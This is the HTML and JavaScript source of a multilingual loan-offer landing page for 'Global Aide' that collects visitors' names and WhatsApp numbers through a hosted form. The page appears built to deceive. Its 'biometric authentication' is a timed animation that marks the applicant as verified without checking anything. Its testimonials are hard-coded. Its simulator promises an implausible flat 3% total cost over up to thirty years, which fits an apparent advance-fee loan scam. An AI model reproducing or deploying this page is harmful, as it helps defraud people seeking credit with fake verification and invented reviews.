<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Global Aide | Finance Elite 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background-color: #1a1d21; color: #ffffff; }
        .step { display: none; animation: fadeIn 0.4s ease-out; }
        .step.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        /* Cartes de langue style Dark */
        .lang-btn { background: #24292e; border: 2px solid transparent; transition: all 0.3s; cursor: pointer; }
        .lang-btn.selected { border-color: #3b82f6; background: #2d333b; transform: scale(1.05); box-shadow: 0 0 20px rgba(59, 130, 246, 0.3); }
        
        /* Bouton Continuer */
        .btn-main { background: #1d4ed8; transition: all 0.2s; box-shadow: 0 4px 15px rgba(29, 78, 216, 0.4); }
        .btn-main:active { transform: scale(0.96); }

        /* Animation Scan */
        #laser-line { position: absolute; left: 0; width: 100%; height: 3px; background: #3b82f6; box-shadow: 0 0 15px #3b82f6; animation: scanAnimate 2s linear infinite; }
        @keyframes scanAnimate { 0%, 100% { top: 15%; } 50% { top: 85%; } }

        /* Scroll Témoignages */
        .scroll-parent { width: 100%; overflow: hidden; background: #24292e; padding: 12px 0; border-radius: 20px; }
        .scroll-child { display: flex; width: max-content; animation: scroll 30s linear infinite; }
        @keyframes scroll { from { transform: translateX(0); } to { transform: translateX(-50%); } }

        .slider { -webkit-appearance: none; width: 100%; height: 6px; border-radius: 10px; background: #374151; outline: none; }
        .slider::-webkit-slider-thumb { -webkit-appearance: none; width: 26px; height: 26px; border-radius: 50%; background: #3b82f6; cursor: pointer; border: 4px solid #1f2937; }
    </style>
</head>
<body class="font-sans overflow-x-hidden">

    <audio id="scanSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

    <nav class="p-5 flex justify-between items-center border-b border-gray-800 bg-[#1a1d21]/90 backdrop-blur-md sticky top-0 z-50">
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white font-bold shadow-lg">G</div>
            <div class="font-black text-white uppercase tracking-tighter">Global Aide</div>
        </div>
        <button class="bg-[#24292e] text-[10px] font-bold text-gray-400 px-4 py-2 rounded-lg border border-gray-700">
            <i class="fas fa-certificate text-yellow-500 mr-1"></i> <span id="nav-testi">AVIS</span>
        </button>
    </nav>

    <section id="step-lang" class="step active min-h-[80vh] flex-col items-center justify-center p-6 text-center">
        <div class="mb-14">
            <h1 class="text-5xl font-black text-white mb-3 tracking-tighter italic uppercase">GLOBAL EVOLUTION</h1>
            <p class="text-gray-500 text-[10px] font-bold uppercase tracking-[0.4em]">Smart Finance Solutions 2026</p>
        </div>

        <div class="grid grid-cols-2 gap-4 w-full max-w-sm mb-12">
            <button onclick="selectLang('fr')" class="lang-btn p-8 rounded-[2rem] flex flex-col items-center gap-3" id="btn-fr">
                <span class="text-4xl">🇫🇷</span><span class="font-bold text-[10px] text-gray-300">FRANÇAIS</span>
            </button>
            <button onclick="selectLang('en')" class="lang-btn p-8 rounded-[2rem] flex flex-col items-center gap-3" id="btn-en">
                <span class="text-4xl">🇺🇸</span><span class="font-bold text-[10px] text-gray-300">ENGLISH</span>
            </button>
            <button onclick="selectLang('es')" class="lang-btn p-8 rounded-[2rem] flex flex-col items-center gap-3" id="btn-es">
                <span class="text-4xl">🇪🇸</span><span class="font-bold text-[10px] text-gray-300">ESPAÑOL</span>
            </button>
            <button onclick="selectLang('de')" class="lang-btn p-8 rounded-[2rem] flex flex-col items-center gap-3" id="btn-de">
                <span class="text-4xl">🇩🇪</span><span class="font-bold text-[10px] text-gray-300">DEUTSCH</span>
            </button>
        </div>

        <button onclick="goToStep(2)" class="btn-main w-full max-w-sm py-6 rounded-full font-black text-white flex items-center justify-center gap-4">
            <span id="btn-cont-text">CONTINUER</span> <i class="fas fa-arrow-right"></i>
        </button>
    </section>

    <section id="step-sim" class="step min-h-screen flex-col p-4 bg-[#1a1d21]">
        <div class="max-w-xl mx-auto w-full">
            <div class="scroll-parent mb-8"><div class="scroll-child" id="mini-testi-scroll"></div></div>

            <div class="bg-[#24292e] p-8 rounded-[2.5rem] border border-gray-800 shadow-2xl">
                <h2 class="text-xl font-black mb-10 text-center uppercase tracking-widest text-blue-400" id="sim-title">Simulateur</h2>
                
                <div class="space-y-10">
                    <div>
                        <div class="flex justify-between mb-4"><span id="lbl-amt" class="text-xs font-bold text-gray-500 uppercase">Montant</span><span class="text-blue-400 font-black"><span id="val-amt">5000</span> <span class="curr">€</span></span></div>
                        <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="5000" oninput="updateSim()" class="slider">
                    </div>
                    <div>
                        <div class="flex justify-between mb-4"><span id="lbl-dur" class="text-xs font-bold text-gray-500 uppercase">Durée</span><span class="text-blue-400 font-black"><span id="val-dur">2</span> <span id="lbl-years">Ans</span></span></div>
                        <input type="range" id="yearRange" min="1" max="30" step="1" value="2" oninput="updateSim()" class="slider">
                    </div>
                </div>

                <div class="mt-10 bg-[#1a1d21] p-6 rounded-3xl border border-gray-800">
                    <div class="flex justify-between items-center mb-4"><span id="res-lbl-men" class="text-[10px] text-gray-500 font-bold uppercase">Mensualité</span><span id="res-monthly" class="text-2xl font-black text-white">...</span></div>
                    <div class="flex justify-between items-center"><span id="res-lbl-tot" class="text-[10px] text-gray-500 font-bold uppercase">Total</span><span id="res-total" class="font-bold text-blue-500">...</span></div>
                </div>
                
                <button onclick="goToStep(3)" class="btn-main w-full py-5 rounded-full font-black mt-8 uppercase tracking-widest text-sm">Suivant</button>
            </div>
        </div>
    </section>

    <section id="step-form" class="step min-h-screen flex-col p-4">
        <div class="max-w-xl mx-auto w-full pb-20">
            <div class="bg-[#24292e] p-8 rounded-[3rem] border border-gray-800 shadow-2xl">
                <form action="https://formspree.io/f/0f51a6e2-1eec-4545-9d6a-8cddc84a8f80" method="POST" class="space-y-5">
                    <input type="hidden" name="PRÊT_MONTANT" id="h-m">
                    <input type="hidden" name="PRÊT_DURÉE" id="h-d">
                    <input type="hidden" name="BIOMETRIE" id="h-auth" value="Non validé">
                    
                    <h2 class="text-2xl font-black mb-8 uppercase text-blue-400" id="form-title">Dossier Digital</h2>
                    <input type="text" name="Nom" id="i-nom" placeholder="Nom complet" required class="w-full p-5 bg-[#1a1d21] rounded-2xl border border-gray-700 outline-none focus:border-blue-500 text-white">
                    <input type="tel" name="WhatsApp" id="i-wa" placeholder="WhatsApp" required class="w-full p-5 bg-[#1a1d21] rounded-2xl border border-gray-700 outline-none focus:border-blue-500 text-white">

                    <div class="p-6 bg-[#1a1d21] rounded-3xl border border-gray-700 text-center">
                        <label class="text-[9px] font-bold text-gray-500 uppercase block mb-4" id="lbl-scan">Authentification Biométrique</label>
                        <div id="biometric-area" onclick="startScan()" class="w-24 h-24 mx-auto rounded-2xl border border-gray-700 flex items-center justify-center cursor-pointer relative overflow-hidden bg-[#24292e]">
                            <i id="finger-icon" class="fas fa-fingerprint text-4xl text-gray-600"></i>
                            <div id="laser-line" class="hidden"></div>
                        </div>
                        <p id="status-text" class="text-[10px] font-bold mt-4 text-blue-500 uppercase"></p>
                    </div>

                    <button type="submit" class="btn-main w-full py-6 rounded-full font-black uppercase text-white shadow-xl" id="btn-submit">Envoyer</button>
                </form>
            </div>
        </div>
    </section>

    <script>
        let cL = 'fr';
        const tr = {
            fr: { cont: "CONTINUER", sim: "SIMULATEUR", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total", nav: "AVIS", fTitle: "DOSSIER", scan: "BIOMÉTRIE", scanWait: "ANALYSE...", scanOk: "CONFIRMÉ", submit: "ENVOYER", tests: [{n:"Jean M.", t:"Rapide et pro", i:"JM"}, {n:"Awa D.", t:"Taux 3% validé", i:"AD"}] },
            en: { cont: "CONTINUE", sim: "SIMULATOR", amt: "Amount", dur: "Duration", yr: "Yrs", men: "Monthly", tot: "Total", nav: "REVIEWS", fTitle: "FILE", scan: "BIOMETRICS", scanWait: "SCANNING...", scanOk: "VERIFIED", submit: "SUBMIT", tests: [{n:"John S.", t:"Very efficient", i:"JS"}] },
            es: { cont: "CONTINUAR", sim: "SIMULADOR", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total", nav: "AVISOS", fTitle: "EXPEDIENTE", scan: "BIOMETRÍA", scanWait: "ESCANEO...", scanOk: "CONFIRMADO", submit: "ENVIAR", tests: [{n:"Carlos P.", t:"Muy rápido", i:"CP"}] }
        };

        function selectLang(l) {
            cL = l;
            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('selected'));
            const activeBtn = document.getElementById('btn-' + l);
            if(activeBtn) activeBtn.classList.add('selected');
            updateUI();
        }

        function goToStep(s) {
            const steps = [null, 'step-lang', 'step-sim', 'step-form'];
            document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
            const nextStep = document.getElementById(steps[s]);
            if(nextStep) nextStep.classList.add('active');
            window.scrollTo(0,0);
        }

        function updateSim() {
            const a = document.getElementById('amountRange').value;
            const y = document.getElementById('yearRange').value;
            document.getElementById('val-amt').innerText = a;
            document.getElementById('val-dur').innerText = y;
            const total = Math.round(a * 1.03);
            const monthly = Math.round(total / (y * 12));
            document.getElementById('res-monthly').innerText = monthly + (cL==='en'?' $':' €');
            document.getElementById('res-total').innerText = total + (cL==='en'?' $':' €');
            document.getElementById('h-m').value = a;
            document.getElementById('h-d').value = y;
        }

        function updateUI() {
            const t = tr[cL] || tr.fr;
            document.getElementById('btn-cont-text').innerText = t.cont;
            document.getElementById('sim-title').innerText = t.sim;
            document.getElementById('lbl-amt').innerText = t.amt;
            document.getElementById('lbl-dur').innerText = t.dur;
            document.getElementById('lbl-years').innerText = t.yr;
            document.getElementById('res-lbl-men').innerText = t.men;
            document.getElementById('res-lbl-tot').innerText = t.tot;
            document.getElementById('nav-testi').innerText = t.nav;
            document.getElementById('form-title').innerText = t.fTitle;
            document.getElementById('lbl-scan').innerText = t.scan;
            document.getElementById('btn-submit').innerText = t.submit;

            const scrollChild = document.getElementById('mini-testi-scroll');
            scrollChild.innerHTML = '';
            const list = [...t.tests, ...t.tests, ...t.tests];
            list.forEach(item => {
                scrollChild.innerHTML += `<div class="bg-[#1a1d21] px-6 py-3 rounded-xl mx-2 border border-gray-700 flex items-center gap-3">
                    <div class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-[10px] font-bold">${item.i}</div>
                    <div class="text-left"><div class="text-[9px] font-bold">${item.n}</div><div class="text-[8px] text-gray-500">${item.t}</div></div>
                </div>`;
            });
            updateSim();
        }

        function startScan() {
            const laser = document.getElementById('laser-line');
            const status = document.getElementById('status-text');
            const icon = document.getElementById('finger-icon');
            const sound = document.getElementById('scanSound');
            
            laser.classList.remove('hidden');
            status.innerText = tr[cL].scanWait;
            icon.classList.add('text-blue-500', 'animate-pulse');

            setTimeout(() => {
                laser.classList.add('hidden');
                status.innerText = tr[cL].scanOk;
                status.classList.replace('text-blue-500', 'text-green-500');
                icon.classList.replace('text-gray-600', 'text-green-500');
                icon.classList.remove('animate-pulse');
                if(sound) sound.play();
                document.getElementById('h-auth').value = "Validé par Biométrie";
            }, 2500);
        }

        window.onload = () => { selectLang('fr'); };
    </script>
</body>
</html>
